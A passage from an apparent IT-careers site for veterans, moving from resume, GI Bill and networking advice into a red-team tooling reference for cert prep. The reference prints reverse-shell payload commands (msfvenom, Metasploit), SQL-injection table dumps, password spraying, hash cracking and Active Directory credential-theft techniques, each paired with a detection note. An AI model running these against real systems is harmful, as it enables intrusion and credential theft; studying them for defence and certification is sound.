"Responsible for maintaining unit IT equipment."

# Strong — same underlying experience, framed around impact
"Maintained 40+ workstations and network devices supporting a 120-person
unit with zero unplanned downtime over a 12-month deployment, reducing
average ticket resolution time by replacing ad-hoc fixes with a
documented troubleshooting checklist."

If you don't have exact numbers, reasonable estimates are fine — "approximately," "more than," and "supported a team of roughly X" all read as honest and specific. What recruiters are scanning for is scale and outcome, not decimal-point precision.

Mindset

Not my circus, not my monkey — but also, it's now your circus

Military culture often instills "stay in your lane, don't volunteer for extra work" as survival wisdom — and that instinct can undersell you in interviews. The civilian IT world rewards people who *did* step outside their narrow job description: the radio tech who also fixed everyone's laptop issues, the supply clerk who built a spreadsheet that automated half the unit's paperwork. Those moments where you picked up something that "wasn't your job" are often the most resume-worthy stories you have. Don't bury them out of habit.

Beginner

Using the GI Bill and Tuition Assistance for IT Certifications

Why this matters

Education benefits are some of the best-kept "secrets" in the military community

Many service members and veterans leave significant education benefits unused — not from lack of eligibility, but from not knowing the programs exist, assuming the paperwork is too complicated, or believing (often incorrectly) that the benefit only covers traditional four-year degrees. IT certifications are frequently fundable through these same programs, and stacking several certs can be a faster, cheaper path into the field than a full degree program — especially if your goal is to start working sooner rather than later.

Concept

The major programs, at a glance

ProgramWho it's generally forWhat it can cover
Post-9/11 GI BillVeterans and some active-duty members meeting service requirementsTuition, housing allowance (BAH), and — important for this audience — licensing & certification exam reimbursement
Tuition Assistance (TA)Active-duty service members, by branch programCourses and, in some programs, certification training while still serving
VR&E (Chapter 31)Veterans with a service-connected disability affecting employabilityTraining, certification costs, and career counseling support — often more comprehensive than people expect
State veteran education benefitsVaries — many states offer additional programs on top of federal benefitsVaries by state; worth checking your state's department of veterans affairs directly

Note specifically: the Post-9/11 GI Bill's licensing and certification reimbursement is separate from its tuition coverage and is often overlooked — it can directly fund the exam fee for things like CompTIA Security+, AWS certifications, or Cisco credentials, without needing to be enrolled in a degree program at all.

Hands-on

A practical first-steps checklist

# 1. Confirm your eligibility and remaining benefit balance
#    — VA.gov and your installation's education center are the
#    authoritative sources; don't rely on secondhand information

# 2. Ask SPECIFICALLY about certification/licensing reimbursement
#    — this is frequently a different process than degree-program
#    tuition, with its own forms and approval steps

# 3. Confirm the certification you want is on an approved list
#    — most IT vendor certs (CompTIA, AWS, Microsoft, Cisco) are
#    commonly approved, but verify with your education office BEFORE
#    you pay out of pocket and try to get reimbursed after the fact

# 4. Keep every receipt, confirmation email, and exam voucher
#    — reimbursement claims move much faster with complete
#    documentation than with "I'm pretty sure I paid for that"

# 5. Talk to your installation's education office or a
#    Veteran Service Organization (VSO) — they exist specifically
#    to help you navigate this, and the help is free
Mindset

Assume makes an ass out of you and me — verify your specific situation

Benefit rules change, vary by branch, by discharge status, by years of service, and by which specific program you're using — what worked for a friend who left the service three years ago may not apply to you today. Don't assume you're ineligible because of something you heard secondhand, and don't assume a benefit covers something without confirming it in writing first. A 20-minute conversation with an education counselor or VSO representative can save you from either missing out on something you qualified for, or getting an unpleasant reimbursement surprise after the fact.

Beginner

Networking Events Without the Awkwardness – A Veteran's Field Guide

Why this matters

"Networking" sounds fake until it gets you a job

Plenty of capable people — veterans especially, coming from a culture that often values humility and "letting your work speak for itself" — find the idea of "networking" deeply uncomfortable, even slightly dishonest-feeling. Reframe it: networking is just having genuine conversations with people who do interesting work, and staying in touch. The job-finding part is a side effect of doing that consistently — not the awkward main event it's often made out to be.

Concept

Where IT networking actually happens (most of it isn't fancy galas)

VenueWhat it actually looks likeWhy it works
Local user groups / meetupsA monthly gathering of people who use the same tools (Linux, AWS, cybersecurity) — usually free, usually casualLow-pressure, recurring — you become a familiar face over a few months without ever "selling" yourself
Veteran-focused tech programsOrganizations specifically built to connect transitioning service members with IT employers and mentorsEveryone there already understands your background — no translation needed, no awkward "so, tell me about your service" small talk
Online communitiesSubreddits, Discord servers, LinkedIn groups focused on specific certifications or technologiesLower social pressure than in-person events — you can build relationships entirely on the strength of your questions and contributions
Certification study groupsPeople preparing for the same exam, often meeting weekly to quiz each otherBuilt-in shared goal — conversation starts itself, friendships form naturally around mutual struggle and progress
Hands-on

A simple script for your first conversation (genuinely, not cynically)

# The goal of a first conversation is NOT "get a job out of this person."
# It's "have one genuine, useful exchange." That's it. Everything
# else follows from doing that consistently, many times, over months.

# An opener that works because it's true and specific:
"Hey, I'm transitioning out of [your role] and getting into IT —
 working through my Security+ right now. What got you started
 in this field?"

# A good follow-up that shows you're actually listening:
"That's interesting — how is that different day-to-day from
 what I'd expect coming from [your background]?"

# The single most useful thing you can do afterward — not
# during the conversation, but within 48 hours of it:
"Hey [name], really enjoyed talking about [specific thing they
 said] — wanted to say thanks for the perspective. I'll let you
 know how the Security+ exam goes!"

# That last message is the entire "secret" — most people never
# follow up at all, which means simply doing it puts you ahead
# of nearly everyone else they met that night.
Mindset

Not my circus, not my monkey — but this circus is worth joining

It's tempting to think "I'll network once I actually have something impressive to show" — but that backwards thinking keeps a lot of talented people invisible right when visibility would help them most. The people who'll eventually want to help you get hired are the same people you'd be meeting now, while you're still learning. Showing up consistently while you're a beginner — asking good questions, being genuinely curious, following up — builds the exact relationships that turn into opportunities later. You don't need to be impressive yet. You need to be present, and real.

🔴 Red Team & Offensive Tooling
PT+ OSCP
Recon · Exploitation · AD Attacks · C2 · Password & Wireless ▾
⚠️ Rules of Engagement — Read This First Ethics ▶
Authorized Use Only
These Tools Are for Permission-Based Testing
Every tool in this domain is a reference for authorized penetration testing, CTF competitions, home-lab practice, and cert prep (PenTest+, OSCP, CEH). Running them against systems you don't own or lack written permission to test is illegal in most jurisdictions (CFAA, Computer Misuse Act, etc.). Always work inside a signed scope / rules of engagement, stay within the authorized targets and time window, and handle any data you touch responsibly. Each card pairs offense with a blue-team detection note — because knowing how an attack looks on the wire is what makes you good at both sides.
🗺️ Nmap — The Network Mapper (Deep Dive) Recon ▶
Reference
The Swiss-Army Knife of Discovery
Nmap is the default tool for host discovery, port scanning, service/version detection, and OS fingerprinting. Its scripting engine (NSE) extends it into vuln checks and light exploitation. Authorized targets only.
▸ SCAN TYPES & ESSENTIALS
nmap -sS 10.0.0.0/24        # SYN "half-open" scan (default, fast, needs root)
nmap -sT target             # full TCP connect (no root)
nmap -sU target             # UDP scan (slow; DNS/SNMP/DHCP live here)
nmap -sV -O target          # service versions + OS detection
nmap -p- target             # all 65535 ports (default scans top 1000)
nmap -sC -sV -oA scan target # default scripts + versions, save all formats
nmap -T4 -Pn target          # faster timing; skip host-discovery ping
▸ NSE (SCRIPTING ENGINE)
FlagDoes
-sCRun the default safe script set
--script vulnKnown-vuln checks
--script smb-enum-sharesCategory/named scripts (~600 available)
-AAggressive: -sV -O -sC + traceroute
Blue-team note: a SYN scan shows up as many connections with no completed handshake from one source — IDS (Suricata/Zeek) and firewall logs flag the fan-out. -T4/-T5 timing is loud; real adversaries scan slow.
⚡ Masscan & RustScan — Internet-Scale Port Discovery Recon ▶
Reference
When Nmap Is Too Slow
Masscan is an asynchronous scanner that can probe the entire IPv4 space in minutes by sending packets without waiting for replies. RustScan finds open ports fast, then hands them to Nmap for deep inspection — best of both. Authorized scope and rate limits only; unbounded scanning is disruptive. 
# Masscan — set a sane rate (packets/sec); high rates can DoS the target
masscan 10.0.0.0/16 -p1-65535 --rate 1000 -oL out.txt

# RustScan → auto-pipe discovered ports into nmap -sV -sC
rustscan -a target --range 1-65535 -- -sV -sC
Blue-team note: extremely high packet rates from a single IP to sequential ports are the signature — netflow/IDS thresholds catch it instantly. Attackers throttle to blend in.
🌾 theHarvester & Recon-ng — OSINT Frameworks OSINT ▶
Reference
Passive Intelligence Before You Touch the Target
theHarvester gathers emails, subdomains, hosts, and names from public sources (search engines, certificate transparency, PGP keyservers). Recon-ng is a full framework with a Metasploit-style module system for structured OSINT into a local database. These are passive — they query third parties, not the target directly. 
theHarvester -d example.com -b all      # emails/subdomains from all sources

# Recon-ng — modular, DB-backed
recon-ng
[recon-ng] > marketplace install all
[recon-ng] > modules load recon/domains-hosts/hackertarget
[recon-ng] > options set SOURCE example.com
[recon-ng] > run
Blue-team note: passive OSINT is nearly invisible to the target — the defense is reducing your footprint: scrub metadata, limit what's public, monitor certificate-transparency logs for look-alike domains.
🔭 Amass & Subfinder — Subdomain Enumeration OSINT ▶
Reference
Mapping the Full Attack Surface
Organizations expose far more subdomains than they realize — dev, staging, forgotten apps. Amass (OWASP) and Subfinder aggregate dozens of sources (cert transparency, DNS, APIs) to enumerate them. Finding the forgotten old-admin.example.com is often the way in. 
subfinder -d example.com -all -o subs.txt   # fast, passive
amass enum -passive -d example.com            # passive aggregation
amass enum -active -d example.com -brute       # active: resolves + brute-forces
Blue-team note: maintain your own asset inventory the same way — you can't defend subdomains you forgot you own. Watch for dangling DNS records (subdomain takeover risk).
🛰️ Shodan & Censys — Search Engines for Exposed Devices OSINT ▶
Reference
The Internet, Already Scanned for You
Shodan and Censys continuously scan the internet and index every exposed service — banners, ports, TLS certs, default logins, ICS/SCADA, webcams. Searching them is passive (you query their database, not the target), making them a favorite first step.
▸ SHODAN SEARCH FILTERS
QueryFinds
org:"Example Corp"All indexed hosts for an org
ssl:example.comHosts by TLS certificate
port:3389 country:USExposed RDP in a region
product:MongoDBA specific service/version
"default password"Banners advertising defaults
Blue-team note: search Shodan/Censys for your own org regularly — it's the fastest external-exposure audit there is. Anything you find, an attacker already has.
🔎 Google Dorking, Maltego & SpiderFoot OSINT ▶
Reference
Advanced Search & Automated Link Analysis
Google Dorking uses advanced operators to surface exposed data indexed by search engines (the Google Hacking Database catalogs thousands of proven queries). Maltego and SpiderFoot automate OSINT into visual link graphs — connecting domains, emails, people, and infrastructure.
▸ USEFUL DORKS
OperatorFinds
site:example.com filetype:pdfDocuments on a domain
intitle:"index of" site:example.comOpen directory listings
inurl:admin site:example.comAdmin panels
"password" filetype:logLeaked logs/creds
Blue-team note: dork your own domain to find accidental exposure; use robots.txt, auth, and Google Search Console removal for anything sensitive that's indexed.
🧪 Burp Suite — The Web Pentest Workbench Web ▶
Reference
Intercept, Modify, Replay
Burp Suite is the industry-standard web app testing platform. It sits as a proxy between your browser and the target, letting you inspect and tamper with every request. Authorized targets only.
ToolDoes
ProxyIntercept + edit requests/responses on the fly
RepeaterManually tweak & resend a single request (the core manual-testing loop)
IntruderAutomate payloads over positions — fuzzing, brute force, enumeration
ScannerAutomated vuln crawl (Pro)
Decoder / ComparerEncode/decode & diff responses
Typical flow: browse the app through the proxy to map it → send an interesting request to Repeater → probe for injection/auth flaws by hand → automate with Intruder. Blue-team note: app-layer WAF + anomaly detection on parameter tampering and high request volume from one session.
⚡ OWASP ZAP — The Open-Source Web Scanner Web ▶
Reference
Burp's Free Cousin — Great for CI
OWASP ZAP is a free, open-source web proxy/scanner with much of Burp's core: intercepting proxy, spider, active/passive scanning, and fuzzing. Its automation-friendliness makes it the go-to for DAST in CI/CD — run a baseline scan on every build against a staging deploy. 
# Baseline (passive) scan — safe for CI, no attacks
zap-baseline.py -t https://staging.example.com

# Full active scan (authorized targets only)
zap-full-scan.py -t https://staging.example.com
Blue-team crossover: because ZAP is a defensive tool too, wire it into your own pipeline to catch OWASP Top 10 regressions before release.
💉 sqlmap — Automated SQL Injection Web ▶
Reference
Detect & Exploit SQLi, End to End
sqlmap automates finding and exploiting SQL injection — from detection through data extraction, and even OS shell where the DB permits. Powerful and noisy; authorized scope only. 
sqlmap -u "https://site/item?id=1" --batch    # test a parameter
sqlmap -r request.txt --level 3 --risk 2   # from a saved Burp request
sqlmap -u "..." --dbs                     # list databases
sqlmap -u "..." -D shop -T users --dump    # dump a table
FlagMeaning
--level / --riskHow hard/aggressive to test (1–5 / 1–3)
--tamperEvasion scripts (encode payloads past filters/WAF)
--batchNon-interactive (accept defaults)
Blue-team note: the fix is parameterized queries, not a WAF — but a WAF + DB query logging will scream at sqlmap's payload patterns and error-based probing.
📁 ffuf & Gobuster — Content & Parameter Fuzzing Web ▶
Reference
Finding the Hidden Endpoints
Web apps hide directories, files, vhosts, and parameters that aren't linked anywhere. ffuf (fast, Go) and Gobuster brute-force them from a wordlist — finding /admin, /backup.zip, or an undocumented API parameter. Authorized scope only. 
# Directory discovery — FUZZ marks the injection point
ffuf -u https://site/FUZZ -w wordlist.txt

# Filter noise by response size / status
ffuf -u https://site/FUZZ -w list.txt -fc 404 -fs 0

# Virtual-host discovery
ffuf -u https://site -H "Host: FUZZ.site" -w vhosts.txt

# Gobuster equivalent
gobuster dir -u https://site -w wordlist.txt
Blue-team note: a flood of 404s to random paths from one source is the signature — rate-limit and alert on it. Common wordlists come from SecLists.
🎯 Nuclei — Templated Vulnerability Scanning Web ▶
Reference
Community-Powered Checks at Scale
Nuclei runs thousands of YAML-defined templates against targets to detect known CVEs, misconfigurations, exposed panels, and default creds — fast and low-false-positive. Dual-use: attackers find weak spots; defenders scan their own estate the same way. 
nuclei -u https://site                    # all default templates
nuclei -l hosts.txt -t cves/ -severity critical,high
nuclei -u https://site -t exposures/       # exposed configs/keys
Blue-team note: run Nuclei against your own external surface on a schedule — it's one of the fastest ways to catch a newly-disclosed CVE affecting you before an attacker does.
🔬 Nikto & WPScan — Server & CMS Scanning Web ▶
Reference
Quick Wins on Web Servers & WordPress
Nikto is a fast (loud) web-server scanner for known dangerous files, outdated software, and misconfigurations. WPScan targets WordPress specifically — enumerating plugins/themes/users and matching them to known vulns (WordPress powers ~40% of the web, so it's a huge attack surface). Authorized targets only. 
nikto -h https://site                       # server misconfig sweep
wpscan --url https://site --enumerate vp,u   # vuln plugins + users
Blue-team note: both are extremely noisy — trivially caught by IDS/WAF. Defense is patching, removing version banners, and keeping CMS plugins minimal and current.
🧨 Metasploit Framework — Modules, Sessions & Workflow Exploitation ▶
Reference
The Standard Exploitation Framework
Metasploit bundles thousands of exploits, payloads, and post-exploitation modules behind one workflow — the core tool for the exploitation phase and a PenTest+/OSCP staple. Authorized targets only; every module here is for permission-based testing.
▸ MODULE TYPES
TypeDoes
exploitDelivers a payload via a vulnerability
payloadCode that runs post-exploit (e.g. Meterpreter)
auxiliaryScanners, fuzzers, no payload
postPost-exploitation (loot, pivot, persist)
encoderObfuscate payloads past simple filters
▸ CONSOLE WORKFLOW
msfconsole
msf> search type:exploit smb
msf> use exploit/windows/smb/...
msf> show options
msf> set RHOSTS 10.0.0.5
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST 10.0.0.1
msf> run                        # → opens a session on success
msf> sessions -i 1              # interact with session 1
Blue-team note: default Meterpreter and stock modules have well-known signatures — EDR and AV catch them readily. Detection maps directly to ATT&CK exploitation + C2 techniques.
📦 msfvenom — Payload Generation Exploitation ▶
Reference
Standalone Payloads in Any Format
msfvenom generates payloads outside the console — an executable, script, or shellcode you deliver during an authorized engagement (e.g. a reverse shell for a lab box you've been scoped to test). It pairs a payload with an output format and optional encoders. 
# Windows reverse-shell EXE (lab/authorized use)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# List payloads / formats
msfvenom --list payloads
msfvenom --list formats
FlagMeaning
-pPayload
-fOutput format (exe, elf, raw, python, …)
-e / -iEncoder & iterations (basic evasion)
Blue-team note: the LHOST/LPORT callback is the tell — outbound connections to an unusual host/port right after a file executes. Egress filtering + EDR behavioral rules catch it.
🗃️ Searchsploit & Exploit-DB — Finding Public Exploits Exploitation ▶
Reference
Match a Version to a Known Exploit
Once enumeration gives you exact software versions, the question is: is there a public exploit? Exploit-DB is the archive; searchsploit is its offline CLI (ships with Kali). Vet before you run — public PoCs can be broken, or booby-trapped. 
searchsploit apache 2.4          # find exploits for a version
searchsploit -x php/webapps/1234  # view the exploit source
searchsploit -m php/webapps/1234  # copy it locally to inspect/edit
Blue-team note: this is why version-hiding + fast patching matter — the entire chain is "know the version → look up the exploit." Remove version banners and keep software current.
🐍 Impacket — The Windows/AD Python Toolkit Exploitation ▶
Reference
Speak Windows Protocols From Linux
Impacket is a collection of Python scripts that implement Windows network protocols (SMB, Kerberos, MSRPC) — the backbone of hands-on Active Directory testing. It lets you move laterally, dump creds, and execute commands with credentials you've legitimately obtained during an engagement. Authorized AD environments only.
ScriptDoes
psexec.pyCommand execution over SMB (SYSTEM shell)
wmiexec.pyQuieter command exec via WMI
secretsdump.pyDump hashes (SAM, LSA, NTDS.dit)
GetUserSPNs.pyKerberoasting — request service tickets
ntlmrelayx.pyRelay captured NTLM auth to other hosts
Blue-team note: these leave clear Windows Event Log traces — service creation (7045) for psexec, ticket requests (4769) for Kerberoasting, unusual SMB auth patterns for relay. Sysmon + a SIEM rule per technique catches them.
🩸 BloodHound & SharpHound — Attack-Path Graphing AD Attacks ▶
Reference
"Who Can Reach Domain Admin, and How?"
Active Directory permissions form a graph so complex no human can audit it by eye. SharpHound (the collector) enumerates users, groups, sessions, and ACLs; BloodHound loads that into a graph DB and finds the shortest path from a low-priv foothold to Domain Admin. Authorized AD assessments only.
ConceptDetail
CollectionSharpHound gathers sessions, ACLs, group membership, GPOs
EdgesRelationships like MemberOf, AdminTo, GenericAll, HasSession
Pre-built queries"Shortest path to Domain Admins", "Kerberoastable users"
Blue-team note: defenders run BloodHound too — it's the best way to find and cut those paths before an attacker walks them. Collection generates heavy LDAP/SMB queries that anomaly detection can flag.
🔓 Mimikatz — Credential Extraction AD Attacks ▶
Reference
The Tool That Redefined AD Security
Mimikatz extracts plaintext passwords, hashes, and Kerberos tickets from Windows memory (LSASS), and forges tickets. It's the canonical post-exploitation credential tool — understanding it is essential for both attack and defense. Authorized, lab, and cert-prep contexts only.
TechniqueWhat
sekurlsa::logonpasswordsDump creds/hashes from LSASS memory
Pass-the-HashAuthenticate with an NTLM hash — no password needed
Pass-the-TicketReuse a stolen Kerberos ticket
Golden TicketForge a TGT with the krbtgt hash — domain-wide persistence
DCSyncImpersonate a DC to pull password hashes via replication
Blue-team note: defenses are Credential Guard (protects LSASS), LSASS-access alerts (Sysmon event 10), disabling NTLM where possible, and watching for anomalous replication (DCSync = event 4662 from a non-DC).
🎟️ Kerberos Attacks — Rubeus & Kerbrute AD Attacks ▶
Reference
Abusing the Ticket System
Kerberos is AD's auth protocol — and its ticketing has abusable quirks. Rubeus is the Swiss-army knife for ticket attacks; Kerbrute does fast username enumeration and password spraying against the KDC. Authorized environments only.
AttackIdea
KerberoastingRequest service tickets (SPNs), crack them offline for the service account password
AS-REP RoastingAccounts with "no pre-auth" leak a crackable hash without any creds
Password sprayOne password against many users (avoids lockout)
Silver TicketForge a service ticket with a service account hash
Blue-team note: Kerberoasting shows as a spike of TGS requests (event 4769) for many SPNs from one user. Defenses: long, random service-account passwords (or gMSAs), and enabling Kerberos pre-auth.
🕸️ Responder & NTLM Relay AD Attacks ▶
Reference
Poison the LAN, Capture the Auth
Responder answers broadcast name-resolution requests (LLMNR/NBT-NS/mDNS) that Windows sends when DNS fails — tricking hosts into authenticating to the attacker and leaking NetNTLM hashes. Combined with ntlmrelayx, the captured auth is relayed to another host to gain access without ever cracking a hash. Authorized internal engagements only.
Blue-team note: this is one of the most common real-world internal footholds. Defenses are concrete and high-impact: disable LLMNR and NBT-NS via GPO, enforce SMB signing (breaks relay), and segment the network. Detection: a host suddenly answering name queries for everything.
📜 ADCS Abuse — Certipy & the ESC Techniques AD Attacks ▶
Reference
When the Certificate Authority Becomes the Backdoor
Active Directory Certificate Services (ADCS) issues certs — and misconfigured templates let a low-priv user request a certificate that authenticates as someone else, up to Domain Admin. Certipy finds and exploits these (the "ESC1–ESC8" family). It's become one of the most impactful AD attack classes. Authorized assessments only.
StepDetail
Findcertipy find — enumerate templates & flag vulnerable ones
ESC1Template lets requester supply the subject → request a cert as any user
AuthenticateUse the cert to get a TGT / NTLM hash for that identity
Blue-team note: audit certificate templates (remove "enrollee supplies subject" + client-auth combos), monitor the CA's issuance logs, and restrict enrollment rights. Certipy's own find is the fastest way for defenders to spot the misconfig first.
📻 C2 Concepts — Beacons, Listeners & Redirectors C2 ▶
Reference
How Operators Control an Authorized Foothold
Command & Control (C2) is how a red-team operator communicates with an implant on a compromised host during an authorized engagement. Understanding the architecture is essential for blue teams — it's the most-detected phase of an attack, and maps to MITRE ATT&CK's Command & Control tactic. Reference for authorized red-team / CRTO-style cert prep and detection engineering.
TermRole
Implant / BeaconCode on the host that calls back for tasking
Listener / Team ServerThe operator side the implant connects to
RedirectorA relay that hides the real team server
Beacon interval / jitterHow often (and how randomly) it checks in
ChannelHTTPS, DNS, SMB — how tasking is carried
Blue-team detection: beaconing shows up as regular, periodic outbound connections to one destination — even over HTTPS, the timing pattern betrays it. Zeek/SIEM analytics on connection intervals, JA3/TLS fingerprints, and newly-seen domains are the classic catches.
⚔️ Cobalt Strike — The Commercial Standard C2 ▶
Reference
Know It Because Everyone Detects It
Cobalt Strike is the long-standing commercial red-team platform — its "Beacon" implant, malleable C2 profiles, and post-ex tooling set the template the whole field copies. It's also heavily abused by real threat actors (cracked versions), which is exactly why defenders study it so closely.
FeatureWhat
BeaconThe implant; HTTP/S, DNS, SMB channels
Malleable C2Profiles that reshape traffic to blend in
Team serverMulti-operator collaboration
Blue-team detection: default Beacon has well-known signatures — named pipes, the "jQuery" malleable profile, specific memory artifacts, and default TLS certs. Tools like BeaconHunter and JA3/JA3S fingerprinting, plus memory scanning (YARA rules for Beacon), catch stock configs readily. This is a study/detection reference, not an operator manual.
🦠 Sliver — The Open-Source Modern C2 C2 ▶
Reference
The Free Alternative Red Teams Adopted
Sliver (BishopFox) is a popular open-source, cross-platform C2 framework — a common Cobalt Strike alternative for budgets and labs. It supports multiple transports (mTLS, HTTP/S, DNS, WireGuard) and per-operation compiled implants. Defenders track it because its adoption (by both red teams and adversaries) is rising fast.
Blue-team detection: the community has published Sliver-specific indicators — default implant characteristics, certificate patterns, and traffic signatures — as YARA and Suricata rules. The general principle holds: any C2's beaconing behavior is detectable even when static signatures aren't, so behavioral analytics matter most.
🧩 Mythic, Havoc & Empire — The C2 Ecosystem C2 ▶
Reference
Know the Landscape
Beyond Cobalt Strike and Sliver, several open frameworks round out what red teams and CTF players use — and what defenders must recognize.
FrameworkCharacter
MythicModular, multi-agent, web-UI collaboration platform
HavocModern open-source C2 with a Cobalt-Strike-like UI
PowerShell Empire / StarkillerClassic PowerShell/Python post-ex C2 (Starkiller = GUI)
Metasploit / MeterpreterAlso a C2 for lighter engagements (see the exploitation card)
Blue-team takeaway: the tools change, the behavior doesn't — implant → periodic callback → tasking → post-ex. Detection engineering built on ATT&CK techniques (C2 over web protocols, DNS, encrypted channels) generalizes across all of them, unlike per-tool signatures.
🔥 Hashcat — GPU Password Cracking Passwords ▶
Reference
The Fastest Way to Recover Passwords From Hashes
Hashcat cracks password hashes using the GPU, trying billions of guesses per second. In an authorized engagement you feed it hashes you legitimately captured (e.g. from an NTDS dump) to demonstrate weak passwords. Authorized assessment / cert-prep / your-own-hashes only.
▸ ATTACK MODES
ModeHow
Dictionary (-a 0)Try each word in a wordlist
+ Rules (-r)Mutate words (Password→P@ssw0rd!) — huge multiplier
Mask (-a 3)Brute-force a known pattern (?u?l?l?l?d?d)
Combinator (-a 1)Join two wordlists
# NTLM hashes, rockyou wordlist + best64 rules
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule
Blue-team note: cracking is offline (nothing to detect on the wire) — the defense is upstream: long passphrases, slow hashes (bcrypt/argon2, not fast MD5/NTLM), and stopping the hash theft in the first place.
🃏 John the Ripper — The Versatile Cracker Passwords ▶
Reference
Auto-Detect & Crack Almost Anything
John the Ripper (the "jumbo" build especially) is the veteran CPU cracker — great at auto-detecting hash formats and packed with *2john helpers that extract crackable hashes from files (ZIP, PDF, SSH keys, KeePass). Authorized use only. 
# Extract a hash from a protected file, then crack it
zip2john secret.zip > hash.txt
john --wordlist=rockyou.txt hash.txt
john --show hash.txt            # reveal cracked passwords
When to use which: Hashcat for raw GPU speed on big hash lists; John for format auto-detection, the *2john extractors, and quick CPU jobs. Most operators keep both.
🚪 Hydra & Medusa — Online Login Attacks Passwords ▶
Reference
Brute-Forcing Live Services (Loudly)
Where Hashcat/John are offline, Hydra and Medusa attack live logins — SSH, RDP, HTTP forms, databases — trying credentials over the network. Password spraying (one password vs many users) is usually smarter than brute-forcing one account into a lockout. Authorized targets only; this is noisy and can lock accounts. 
# SSH, one user, a wordlist (authorized lab host)
hydra -l admin -P passwords.txt ssh://10.0.0.5

# Spray one password across many users
hydra -L users.txt -p 'Spring2026!' ssh://10.0.0.5
Blue-team note: online attacks are very detectable — bursts of failed logins (Windows 4625, SSH auth failures) from one source. Defenses: lockout/backoff, MFA, and rate-limiting. Spraying is stealthier but still shows as many users failing with the same password.
📚 Wordlists & Hash Identification Passwords ▶
Reference
Know the Hash, Pick the List
Two prerequisites make cracking work: identifying the hash type (so you use the right mode) and choosing good wordlists.
Identify withDetail
hashid / hash-identifierGuess the algorithm from a hash's shape
Hashcat example hashesThe wiki maps every -m mode to a sample
Wordlist sourceDetail
rockyou.txtThe classic ~14M-password leak list
SecListsCurated lists for passwords, usernames, fuzzing
CeWLBuild a custom list by spidering the target's own website
Rulesbest64 / OneRuleToRuleThemAll mutate a base list enormously
A targeted list (company terms via CeWL + a good rule set) beats a giant generic list. This is also the defender's lesson: your org's name + a year + ! is exactly what these lists+rules generate.
📶 Aircrack-ng — Wi-Fi Auditing Suite Wireless ▶
Reference
Capture the Handshake, Test the Passphrase
Aircrack-ng is the classic suite for assessing Wi-Fi security: put a card in monitor mode, capture the WPA2 4-way handshake, and test it against a wordlist offline. Only on networks you own or are authorized to test — intercepting others' Wi-Fi is illegal.
ToolStep
airmon-ngPut the adapter into monitor mode
airodump-ngScan APs/clients; capture the handshake
aireplay-ngDeauth a client to force a re-handshake
aircrack-ngCrack the captured handshake vs a wordlist
Blue-team note: deauth floods are detectable by WIDS/WIPS. Defenses: WPA3 (resists offline cracking), long random passphrases, 802.1X/enterprise auth instead of a shared PSK.
📡 Wifite & hcxdumptool — Automated Wi-Fi & PMKID Wireless ▶
Reference
One Command, Modern Attacks
Wifite automates the whole aircrack workflow across all nearby networks. hcxdumptool enables the PMKID attack — grabbing a crackable value from an AP without needing a connected client or a deauth, making it faster and quieter than the classic handshake capture. Authorized networks only.
Blue-team note: PMKID works against APs that include the value in the first handshake message; disabling it where possible, and (again) WPA3 + strong passphrases, is the mitigation. The captured hash still has to be cracked offline — long passphrases defeat it.
🥷 Bettercap — The MITM Framework Wireless ▶
Reference
Man-in-the-Middle Across Wi-Fi, BLE & Ethernet
Bettercap is a modular framework for man-in-the-middle attacks — ARP spoofing on a LAN, Wi-Fi and Bluetooth Low Energy recon, HTTP(S) proxying and credential capture. It's a Swiss-army knife for the network-attack phase of an authorized internal test. Authorized engagements only.
CapabilityDetail
ARP spoofInsert yourself between hosts on a LAN
SniffingCapture credentials/traffic in transit
BLE / Wi-Fi reconEnumerate wireless devices
CapletsScripted attack modules
Blue-team note: ARP spoofing shows as a MAC/IP mapping suddenly changing — dynamic ARP inspection (DAI) on switches and ubiquitous TLS (which MITM can't silently read) are the defenses.
🐬 Flipper Zero & Sub-GHz / RFID Tools Hardware ▶
Reference
The Multi-Tool for Physical & RF Testing
The Flipper Zero is a pocket multi-tool for physical/RF security testing: Sub-GHz radio (garage remotes, some sensors), 125 kHz RFID and 13.56 MHz NFC (access badges), infrared, GPIO, and BadUSB (HID injection). It's popular for learning RF/access-control weaknesses. Test only systems you own or are authorized to assess.
FunctionTests
RFID / NFCWeak/cloneable access badges (e.g. legacy 125 kHz)
Sub-GHzFixed-code remotes without rolling codes
BadUSBHID keystroke injection (like Rubber Ducky)
InfraredUniversal remote / IR devices
Blue-team note: defenses are physical-security hygiene — modern encrypted badge tech (not clonable 125 kHz), rolling-code remotes, USB port control / device allow-listing against BadUSB.
🦆 BadUSB & RF Implants — Rubber Ducky, O.MG, Proxmark, HackRF Hardware ▶
Reference
The Physical Red-Team Kit
Physical access changes everything. This gear (from Hak5 and others) is used in authorized physical/social-engineering assessments to demonstrate what an intruder with seconds of access could do. Authorized physical engagements only.
DeviceWhat
USB Rubber DuckyLooks like a USB stick; types pre-loaded keystrokes at machine speed (BadUSB)
O.MG CableA normal-looking cable with a covert BadUSB/Wi-Fi implant
Proxmark3Advanced RFID research — read/clone/analyze many card types
HackRF / RTL-SDRSoftware-defined radio — receive/transmit across a wide spectrum
Blue-team note: the defenses are unglamorous but effective — lock screens, USB device control/allow-listing, encrypted modern access badges, and staff awareness ("don't plug in found USBs / accept tailgaters").
🪛 Living off the Land — LOLBAS & GTFOBins Post-Ex ▶
Reference
Turning Built-In Tools Into Weapons
Attackers avoid dropping malware by abusing legitimate, pre-installed binaries — "living off the land". On Windows, LOLBAS catalogs signed binaries that can download, execute, or bypass controls; on Linux, GTFOBins lists how common utilities can break out of restricted shells or escalate. Study/detection reference for authorized testing.
ExampleAbuse
certutilDownloads files (looks like a cert tool)
regsvr32 / mshtaExecutes remote scripts
rundll32Runs code via a DLL export
bash/vim/find (GTFOBins)Shell escape / privesc from a limited context
Blue-team note: signatures don't help — these are trusted binaries. Detection is behavioral: certutil making a network connection, or winword.exe spawning powershell.exe, is anomalous even though every binary is signed (this is why Sysmon parent/child chains matter).
🧗 Privilege Escalation Scanners — PEAS & PowerUp Post-Ex ▶
Reference
From User to Root/SYSTEM
After landing a low-priv foothold, operators enumerate the host for escalation paths. linPEAS/winPEAS (and PowerUp/PrivescCheck) automate the checklist — misconfigured services, weak permissions, stored creds, kernel exploits, SUID binaries. Authorized hosts only.
Finds (Windows)Finds (Linux)
Unquoted service pathsSUID/SGID binaries (GTFOBins)
Writable service binariesWritable /etc/passwd, cron jobs
AlwaysInstallElevatedSudo misconfigs (NOPASSWD)
Stored creds / autologonKernel version → known exploits
